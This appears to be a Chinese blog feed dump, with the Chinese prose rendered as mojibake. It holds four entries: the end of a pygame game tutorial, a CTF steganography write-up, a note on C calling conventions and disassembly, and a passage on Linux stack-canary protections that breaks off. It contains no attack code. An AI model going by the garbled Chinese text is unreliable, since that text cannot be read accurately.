class="string">&quot;&quot;&quot;é‡Šæ”¾æŒ‰é”®&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_keyup_events</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">            self.ship.moving_right = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">            self.ship.moving_left = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;åˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®ç¬¦å·å¹¶å°†å…¶æ·»åŠ åˆ°é¡¹ç›®ç¬¦å·ç»„&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_fire_bullet</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.bullets) &lt; self.settings.bullets_allowed:</span><br><span class="line">            new_bullet = Bullet(self)</span><br><span class="line">            self.bullets.add(new_bullet)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ›´æ–°é¡¹ç›®ç¬¦å·çš„ä½ç½®å¹¶æ‘†è„±æ—§é¡¹ç›®ç¬¦å·&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_bullets</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># æ›´æ–°å­å¼¹ä½ç½®</span></span><br><span class="line">        self.bullets.update()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ¶ˆé™¤å­å¼¹</span></span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullets.copy():</span><br><span class="line">            <span class="keyword">if</span> bullet.rect.bottom &lt;= <span class="number">0</span>:</span><br><span class="line">                 self.bullets.remove(bullet)</span><br><span class="line"></span><br><span class="line">        self._check_bullet_alien_collisions()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;å­å¼¹ä¸å¤–æ˜Ÿäººçš„ç¢°æ’&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_bullet_alien_collisions</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># æ¶ˆé™¤è¢«æ‰“åˆ°çš„å­å¼¹å’Œå¤–æ˜Ÿäºº</span></span><br><span class="line">        collisions = pygame.sprite.groupcollide(</span><br><span class="line">                self.bullets, self.aliens, <span class="literal">True</span>, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> collisions:</span><br><span class="line">            <span class="keyword">for</span> aliens <span class="keyword">in</span> collisions.values():</span><br><span class="line">                self.stats.score += self.settings.alien_points * <span class="built_in">len</span>(aliens)</span><br><span class="line">            self.sb.prep_score()</span><br><span class="line">            self.sb.check_high_score()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.aliens:</span><br><span class="line">            <span class="comment"># é”€æ¯ç°æœ‰å­å¼¹å¹¶å»ºç«‹æ–°çš„èˆ°é˜Ÿ</span></span><br><span class="line">            self.bullets.empty()</span><br><span class="line">            self._create_fleet()</span><br><span class="line">            self.settings.increase_speed()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Increase level.</span></span><br><span class="line">            self.stats.level += <span class="number">1</span></span><br><span class="line">            self.sb.prep_level()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ£€æŸ¥èˆ°é˜Ÿæ˜¯å¦å¤„äºè¾¹ç¼˜ï¼Œç„¶åæ›´æ–°èˆ°é˜Ÿä¸­æ‰€æœ‰å¤–æ˜Ÿäººçš„ä½ç½®ã€‚&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_aliens</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._check_fleet_edges()</span><br><span class="line">        self.aliens.update()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¯»æ‰¾ä¸å¤–æ˜Ÿäººçš„ç¢°æ’</span></span><br><span class="line">        <span class="keyword">if</span> pygame.sprite.spritecollideany(self.ship, self.aliens):</span><br><span class="line">            self._ship_hit()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¯»æ‰¾å¤–æ˜Ÿäººæ’åˆ°å±å¹•åº•éƒ¨</span></span><br><span class="line">        self._check_aliens_bottom()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•å¤–æ˜Ÿäººåˆ°è¾¾å±å¹•åº•éƒ¨&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_aliens_bottom</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_rect = self.screen.get_rect()</span><br><span class="line">        <span class="keyword">for</span> alien <span class="keyword">in</span> self.aliens.sprites():</span><br><span class="line">            <span class="keyword">if</span> alien.rect.bottom &gt;= screen_rect.bottom:</span><br><span class="line">                <span class="comment"># Treat this the same as if the ship got hit.</span></span><br><span class="line">                self._ship_hit()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;è¢«å¤–æ˜Ÿäººå‡»ä¸­&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_ship_hit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.stats.ships_left &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># å‡å°‘ç”Ÿå‘½ï¼Œå¹¶æ›´æ–°è®°åˆ†æ¿.</span></span><br><span class="line">            self.stats.ships_left -= <span class="number">1</span></span><br><span class="line">            self.sb.prep_ships()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ‘†è„±ä»»ä½•å‰©ä½™çš„å¤–æ˜Ÿäººå’Œå­å¼¹.</span></span><br><span class="line">            self.aliens.empty()</span><br><span class="line">            self.bullets.empty()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å»ºç«‹ä¸€ä¸ªæ–°çš„èˆ°é˜Ÿå¹¶é›†ä¸­èˆ°èˆ¹.</span></span><br><span class="line">            self._create_fleet()</span><br><span class="line">            self.ship.center_ship()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æš‚åœ</span></span><br><span class="line">            sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.stats.game_active = <span class="literal">False</span></span><br><span class="line">            pygame.mouse.set_visible(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;å»ºç«‹å¤–æ˜Ÿäººçš„èˆ°é˜Ÿ&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_fleet</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># åˆ›å»ºä¸€ä¸ªå¤–æ˜Ÿäººå¹¶è¿ç»­æŸ¥æ‰¾å¤–æ˜Ÿäººçš„æ•°é‡ã€‚</span></span><br><span class="line">        <span class="comment"># æ¯ä¸ªå¤–æ˜Ÿäººä¹‹é—´çš„é—´è·ç­‰äºä¸€ä¸ªå¤–æ˜Ÿäººçš„å®½åº¦ã€‚</span></span><br><span class="line">        alien = Alien(self)</span><br><span class="line">        alien_width, alien_height = alien.rect.size</span><br><span class="line">        available_space_x = self.settings.screen_width - (<span class="number">2</span> * alien_width)</span><br><span class="line">        number_aliens_x = available_space_x // (<span class="number">2</span> * alien_width)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç¡®å®šé€‚åˆå±å¹•çš„å¤–æ˜Ÿäººè¡Œæ•°</span></span><br><span class="line">        ship_height = self.ship.rect.height</span><br><span class="line">        available_space_y = (self.settings.screen_height -</span><br><span class="line">                                (<span class="number">3</span> * alien_height) - ship_height)</span><br><span class="line">        number_rows = available_space_y // (<span class="number">2</span> * alien_height)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å»ºç«‹å®Œæ•´çš„å¤–æ˜Ÿäººèˆ°é˜Ÿ.</span></span><br><span class="line">        <span class="keyword">for</span> row_number <span class="keyword">in</span> <span class="built_in">range</span>(number_rows):</span><br><span class="line">            <span class="keyword">for</span> alien_number <span class="keyword">in</span> <span class="built_in">range</span>(number_aliens_x):</span><br><span class="line">                self._create_alien(alien_number, row_number)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;åˆ›å»ºå¤–æ˜Ÿäººå¹¶å°†å…¶æ”¾ç½®åœ¨è¡Œä¸­&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_alien</span>(<span class="params">self, alien_number, row_number</span>):</span></span><br><span class="line">        alien = Alien(self)</span><br><span class="line">        alien_width, alien_height = alien.rect.size</span><br><span class="line">        alien.x = alien_width + <span class="number">2</span> * alien_width * alien_number</span><br><span class="line">        alien.rect.x = alien.x</span><br><span class="line">        alien.rect.y = alien.rect.height + <span class="number">2</span> * alien.rect.height * row_number</span><br><span class="line">        self.aliens.add(alien)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;å¦‚æœæœ‰ä»»ä½•å¤–æ˜Ÿäººåˆ°è¾¾è¾¹ç¼˜ï¼Œè¯·åšå‡ºé€‚å½“çš„ååº”&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_fleet_edges</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> alien <span class="keyword">in</span> self.aliens.sprites():</span><br><span class="line">            <span class="keyword">if</span> alien.check_edges():</span><br><span class="line">                self._change_fleet_direction()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_change_fleet_direction</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ”¾ä¸‹æ•´ä¸ªèˆ°é˜Ÿå¹¶æ›´æ”¹èˆ°é˜Ÿçš„æ–¹å‘.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> alien <span class="keyword">in</span> self.aliens.sprites():</span><br><span class="line">            alien.rect.y += self.settings.fleet_drop_speed</span><br><span class="line">        self.settings.fleet_direction *= -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ›´æ–°å±å¹•ä¸Šçš„å›¾åƒï¼Œç„¶ååˆ‡æ¢åˆ°æ–°å±å¹•&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_screen</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Update images on the screen, and flip to the new screen.&quot;&quot;&quot;</span></span><br><span class="line">        self.screen.fill(self.settings.bg_color)</span><br><span class="line">        self.ship.blitme()</span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullets.sprites():</span><br><span class="line">            bullet.draw_bullet()</span><br><span class="line">        self.aliens.draw(self.screen)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ç»˜åˆ¶åˆ†æ•°ä¿¡æ¯.</span></span><br><span class="line">        self.sb.show_score()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#å¦‚æœæ¸¸æˆå¤„äºéæ´»åŠ¨çŠ¶æ€ï¼Œè¯·ç»˜åˆ¶æ’­æ”¾æŒ‰é’®.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.stats.game_active:</span><br><span class="line">            self.play_button.draw_button()</span><br><span class="line"></span><br><span class="line">        pygame.display.flip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># è¿è¡Œæ¸¸æˆ</span></span><br><span class="line">    ai = AlienInvasion()</span><br><span class="line">    ai.run_game()</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åœ¨è®¾è®¡æ—¶æ˜¯éœ€è¦ä¸æ–­å¯¹æ¯ä¸ªæ¨¡å—è¿›è¡Œé‡æ„ï¼Œé‡æ„çš„ç›®çš„ä¸€æ˜¯ä¸ºäº†ä½¿ä»£ç çœ‹èµ·æ¥æ›´ç®€æ´ï¼Œè€Œæ˜¯ä¼˜åŒ–ä»£ç ï¼Œå‡å°‘ä¸å¿…è¦çš„ä»£ç ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜éœ€è¦å¯¹é¡¹ç›®è¿›è¡Œä¸æ–­æ£€æŸ¥ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰bugï¼Œå¯¹bugè¦è¿›è¡Œå³ä½¿ä¿®æ”¹ã€‚è¿˜æœ‰ï¼Œpythonè™½ç„¶ä½¿ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ï¼Œä½†æ˜¯éœ€è¦è®°ä½çš„å‡½æ•°å´å¾ˆå¤šï¼Œè¦ç†Ÿç»ƒçš„ä½¿ç”¨ï¼Œå¿…é¡»è¦èƒ½å¤Ÿç†Ÿæ‚‰ç›¸å…³çš„ç¬¬ä¸‰æ–¹åº“ï¼Œè¿™æ ·æ‰èƒ½åšåˆ°æ¸¸åˆƒæœ‰ä½™ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¿ƒå¾— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è“å¸½æ¯MISC</title>
      <link href="/post/%E8%93%9D%E5%B8%BD%E6%9D%AFMISC.html"/>
      <url>/post/%E8%93%9D%E5%B8%BD%E6%9D%AFMISC.html</url>
      
        <content type="html"><![CDATA[<h1 id="å†°å¢©å¢©"><a href="#å†°å¢©å¢©" class="headerlink" title="å†°å¢©å¢©"></a>å†°å¢©å¢©</h1><p>æ‹¿åˆ°é™„ä»¶æ‹–è¿›è™šæ‹Ÿæœºä¸­ä½¿ç”¨binwalkæŸ¥çœ‹</p><p><img src="https://i.loli.net/2021/05/05/Fpan5DGMyYfHrZx.png" alt="å›¾ç‰‡1.png"></p><p>å‘ç°é‡Œé¢å­˜åœ¨rarå‹ç¼©åŒ…ï¼Œä½¿ç”¨foremostè¿›è¡Œåˆ†ç¦»</p><p><img src="https://i.loli.net/2021/05/05/v8i7wY6kUMNRXxA.png" alt="å›¾ç‰‡2.png"></p><p><img src="https://i.loli.net/2021/05/05/WgwaT4hGJ9FlHYU.png" alt="å›¾ç‰‡3.png"></p><p>å‘ç°éŸ³é¢‘å’Œæç¤º<img src="https://i.loli.net/2021/05/05/hxJzEVyRfQGDrFo.png" alt="å›¾ç‰‡4.png"></p><p>å°†éŸ³é¢‘æ”¾è¿›010ï¼Œåœ¨ç»“å°¾å‘ç°cipher<img src="https://i.loli.net/2021/05/06/ubNWz2AeCUgl7X8.png" alt="å›¾ç‰‡5.png"></p><p>å°†å¯¹åº”çš„åå…­è¿›åˆ¶ç å¤åˆ¶ä¸‹æ¥ï¼Œæœç´¢ä»¥0~Fç¼–ç çš„åŠ å¯†æ–¹å¼ï¼Œå‘ç°æ˜¯urlç¼–ç ã€‚<img src="https://i.loli.net/2021/05/05/Aj62JcfVHiRQXdl.png" alt="å›¾ç‰‡6.png"></p><p>å¯¹åå…­è¿›åˆ¶ç è¿›è¡Œå¤„ç†<img src="https://i.loli.net/2021/05/05/IV5ekvFXmoO4R2d.png" alt="å›¾ç‰‡7.png"></p><p>è§£ç åå‘ç°æ˜¯ä¸€å †è¡¨æƒ…åŒ…<img src="https://i.loli.net/2021/05/05/MxWecuYztbjRVHk.png" alt="å›¾ç‰‡9.png"></p><p>å¯¹è¡¨æƒ…åŒ…è¿›è¡Œè§£ç å‘ç°æ— æ³•ç¿»è¯‘ï¼Œæœç´¢äº†ä¸€ä¸‹å‘ç°å¯èƒ½æ˜¯emoji-aesåŠ å¯†ï¼Œä½†ç¼ºå°‘å¯†åŒ™ï¼Œä¹‹åå›å»åœ¨çœ‹mp3æ–‡ä»¶ï¼Œæƒ³åˆ°miscé‡Œé¢æœ‰ä¸€ä¸ªMP3stegoçš„å·¥å…·ï¼Œä½†æ˜¯è¿˜éœ€è¦ä¸€ä¸ªå¯†ç æ‰æœ‰è¡Œï¼Œæƒ³åˆ°ä¹‹å‰çš„eight numbersï¼ŒåŠ ä¸Šé¢˜ç›®åç§°ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å†¬å¥¥ä¼šä¸¾åŠæ—¥æœŸ20220204<img src="https://i.loli.net/2021/05/06/Ru2JVmP3pL4vnIl.png" alt="å›¾ç‰‡11.png"></p><p>å¾—åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå‘ç°æ˜¯pythoné‡Œé¢çš„ä¸€ç§ç¼–ç æ–¹å¼<img src="https://i.loli.net/2021/05/06/zK19G53w4ZsJfBQ.png" alt="å›¾ç‰‡13.png"></p><p>å‘ç°æ˜¯wingdingså›¾æ ‡ï¼Œåœ¨çº¿è§£ç ï¼Œå¾—åˆ°å¯†åŒ™How_6ad_c0uld_a_1cePeak_be?   ä¹‹åè¿›è¡Œemoji-aesè§£ç å¾—åˆ°flag<img src="https://i.loli.net/2021/05/06/Yeg6xybJDlq4GrQ.png" alt="å›¾ç‰‡15.png"></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€å‡½æ•°è°ƒç”¨ä¸å¸¸è§è°ƒç”¨çº¦å®š</title>
      <link href="/post/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%8E%E5%B8%B8%E8%A7%81%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A.html"/>
      <url>/post/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%8E%E5%B8%B8%E8%A7%81%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h1><p>ä¸‹é¢ä»£ç å±•ç¤ºäº†ä¸€ä¸ªç®€å•çš„åŠ æ³•å­å‡½æ•°è°ƒç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">plus</span> <span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c;</span><br><span class="line">    c=plus(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥åæ±‡ç¼–æŸ¥çœ‹</p><p><img src="https://i.loli.net/2021/05/05/WinHfG98h6gNzVs.png" alt="image-20210425221051251.png"></p><p>é¦–å…ˆï¼Œç³»ç»Ÿä¼šå°†1ï¼Œ2åˆ†åˆ«ç§»åŠ¨åˆ°aï¼Œbå¯¹åº”çš„åœ°å€ä¸­ï¼Œä¹‹åä»å³è‡³å·¦å°†bï¼Œaå¯¹åº”åœ°å€çš„å€¼ç§»åŠ¨åˆ°eaxï¼Œecxä¸­ï¼Œä¹‹åè¿›è¡Œè·³è½¬åˆ°pluså‡½æ•°çš„pltè¡¨</p><p><img src="https://i.loli.net/2021/05/05/fkHsWxKLNU9uXBb.png" alt="image-20210425221706739.png"></p><p>å†è·³è½¬åˆ°pluså‡½æ•°çš„å®é™…ä¸­</p><p><img src="https://i.loli.net/2021/05/05/K1Qb8IYfksJ6lUd.png" alt="image-20210425221830540.png"></p><p>å­å‡½æ•°å…ˆæ˜¯æŠŠebpä¿å­˜åœ¨æ ˆä¸­ï¼Œä¹‹åé€šè¿‡movæŒ‡ä»¤å°†ebpæŒ‡å‘espæŒ‡å‘çš„ä½ç½®ï¼Œespå†è¿›è¡ŒæŠ¬æ ˆå¤„ç†ï¼Œç„¶åä¿å­˜ç°åœºï¼ˆå°†ebxï¼Œesiï¼Œediå­˜å‚¨çš„å€¼ä¿å­˜åœ¨å †æ ˆä¸­ï¼‰,æ¥ä¸‹æ¥æŠŠebp-0chå¯¹åº”çš„åœ°å€ç§»åŠ¨åˆ°ediä¸­ã€‚ä¹‹åå‘ecxèµ‹30hï¼Œå‘eaxèµ‹0CCCCCCCChï¼Œç„¶åå¯¹es:ediå¯¹åº”çš„åœ°å€å¼€å§‹å¾ªç¯èµ‹å€¼ï¼ˆæ•´ä¸ªè¿‡ç¨‹å°±æ˜¯å¯¹ç¼“å†²åŒºåˆå§‹åŒ–ï¼‰ã€‚ï¼ˆåé¢ä¸¤ä¸ªä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œå¤ªèœäº†ğŸ˜…ï¼‰</p><p>è¡¥ï¼šç¼“å†²åŒºç”¨äºå­˜å‚¨å‡½æ•°è°ƒç”¨é‡Œé¢ç”³è¯·çš„å˜é‡ï¼Œå› ä¸ºè¿™äº›å˜é‡å­˜æ”¾åœ¨ç¼“å†²åŒºï¼Œå½“è°ƒç”¨å®Œæˆåç¼“å†²åŒºä¼šè¢«ä¸¢å¼ƒï¼Œæ‰€ä»¥å‡½æ•°è°ƒç”¨é‡Œé¢çš„å˜é‡æ— æ³•è¢«å‡½æ•°å¤–é¢è®¿é—®åˆ°</p><p><img src="https://i.loli.net/2021/05/05/A2XJYcVMrRgTzaP.png" alt="image-20210426075548516.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯å°†açš„å€¼ç§»åŠ¨åˆ°eaxä¸­å†åŠ bçš„å€¼ï¼Œåé¢å†æ¢å¤ç°åœºï¼Œå†å†…å¹³æ ˆï¼ˆadd esp 0C0hï¼‰,ä¹‹åæ¯”è¾ƒespï¼Œebpæ˜¯å¦ç›¸åŒï¼Œï¼ˆå¦‚æœç›¸åŒæˆ‘ä¹Ÿä¸çŸ¥é“ä¼šæ€ä¹ˆæ ·ï¼ŒğŸ˜…ï¼‰ï¼Œç„¶åå°†espæŒ‡å‘ebpæŒ‡å‘çš„ä½ç½®ï¼Œå°†ebpè¿”å›åˆ°åŸæ¥çš„åœ°æ–¹ã€‚</p><p><img src="https://i.loli.net/2021/05/05/Cc6jF9qiHUAKoG7.png" alt="image-20210425222327010.png"></p><p>æœ€åå¤–å¹³æ ˆï¼ˆadd esp,8ï¼‰ï¼Œå°†è®¡ç®—ç»“æœä»eaxç§»åˆ°å˜é‡cå¯¹åº”çš„åœ°å€ä¸­ï¼Œè‡³æ­¤å®Œæˆå‡½æ•°è°ƒç”¨</p><p><img src="https://i.loli.net/2021/05/05/CAj5SFWvYikT38l.png" alt="image-20210426075951991.png"></p><h1 id="å¸¸è§çš„ä¸‰ç§è°ƒç”¨çº¦å®šï¼ˆ32ä½ï¼‰"><a href="#å¸¸è§çš„ä¸‰ç§è°ƒç”¨çº¦å®šï¼ˆ32ä½ï¼‰" class="headerlink" title="å¸¸è§çš„ä¸‰ç§è°ƒç”¨çº¦å®šï¼ˆ32ä½ï¼‰"></a>å¸¸è§çš„ä¸‰ç§è°ƒç”¨çº¦å®šï¼ˆ32ä½ï¼‰</h1><p><img src="https://i.loli.net/2021/05/05/vaOVrxQuMnZfL4F.png" alt="image-20210426080234751.png"></p><p>ç¬¬ä¸€ç§å°±æ˜¯ç³»ç»Ÿé»˜è®¤çš„è°ƒç”¨çº¦å®šï¼Œè°ƒç”¨è€…æ¸…ç†æ ˆï¼Œå°±æ˜¯å’Œä¸Šé¢å¤–å¹³æ ˆï¼ˆadd esp,8ï¼‰å·®ä¸å¤š</p><p>ç¬¬äºŒç§å°±æ˜¯åœ¨è¿”å›æ—¶å¯¹retè¿›è¡Œå¤„ç†ï¼Œä½¿æ ˆæŒ‡é’ˆæŒ‡å‘è°ƒç”¨å‚æ•°å‰çš„åœ°å€ï¼ˆå¦‚ï¼šret 8ï¼‰</p><p>ç¬¬ä¸‰ç§å°±æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ å‚ï¼Œä½†å¦‚æœå¯„å­˜å™¨ä¸å¤Ÿè¿˜æ˜¯å¾—å€ŸåŠ©æ ˆæ¥ä¼ å‚ï¼Œå› ä¸ºcpuä¸å¯„å­˜å™¨ä¹‹é—´ä¼ é€’ç›¸å¯¹äºcpuä¸å†…å­˜æ›´å¿«ï¼Œæ‰€ä»¥ç¬¬ä¸‰ç§æ–¹æ³•åœ¨å‚æ•°è¾ƒå°‘æ—¶ï¼Œæ›´åŠ é«˜æ•ˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Cè¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”¶è· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå¸¸è§çš„ä¿æŠ¤æœºåˆ¶</title>
      <link href="/post/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E2%BD%A4%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.html"/>
      <url>/post/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E2%BD%A4%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.html</url>
      
        <content type="html"><![CDATA[<h1 id="checksecï¼ˆgdbå®‰è£…å¥½å°±æœ‰ï¼‰"><a href="#checksecï¼ˆgdbå®‰è£…å¥½å°±æœ‰ï¼‰" class="headerlink" title="checksecï¼ˆgdbå®‰è£…å¥½å°±æœ‰ï¼‰"></a>checksecï¼ˆgdbå®‰è£…å¥½å°±æœ‰ï¼‰</h1><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>åŠ¨æ€è°ƒè¯•è½¯ä»¶ï¼Œå¿…å¤‡ã€‚</p><p>å®‰è£…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gdb</span><br></pre></td></tr></table></figure><h2 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h2><p>ä½œç”¨ï¼šå®ƒæ˜¯ç”¨æ¥æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶å±æ€§ï¼Œä¾‹å¦‚PIE, RELRO, PaX, Canaries, ASLR, Fortify Sourceç­‰ç­‰å±æ€§ã€‚</p><p>ç”¨æ³•ï¼šchecksec filename</p><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec start</span><br><span class="line">CANARY    : disabled(è¿™ä¸ªé€‰é¡¹è¡¨ç¤ºæ ˆä¿æŠ¤åŠŸèƒ½æœ‰æ²¡æœ‰å¼€å¯ã€‚)</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure><h1 id="CANNARY-æ ˆä¿æŠ¤"><a href="#CANNARY-æ ˆä¿æŠ¤" class="headerlink" title="CANNARY(æ ˆä¿æŠ¤)"></a>CANNARY(æ ˆä¿æŠ¤)</h1><p>æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆä¸­é«˜å±åŒºæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ 